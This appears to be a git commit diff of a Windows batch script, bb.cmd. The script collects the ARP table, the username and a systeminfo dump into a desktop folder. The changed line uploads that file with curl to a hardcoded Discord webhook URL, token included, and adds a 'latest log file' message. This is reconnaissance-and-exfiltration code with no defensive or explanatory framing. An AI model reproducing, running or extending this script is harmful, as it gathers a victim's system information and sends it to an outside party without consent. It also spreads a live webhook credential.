394cd375c7b157ed95a3b2df37d60997cae07306
lsecanon <sherapsy@gmail.com>
2025-03-15 13:19:03 -0700

    Update bb.cmd

--- bb.cmd
+++ bb.cmd
@@ -5,5 +5,5 @@ pause
 arp -a > %userprofile%\desktop\bb\arp.txt
 pause
 for /f "delims=" %n in ('whoami') do set name=%n
-curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
+curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" -F "content=Here's the latest log file!" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
 pause
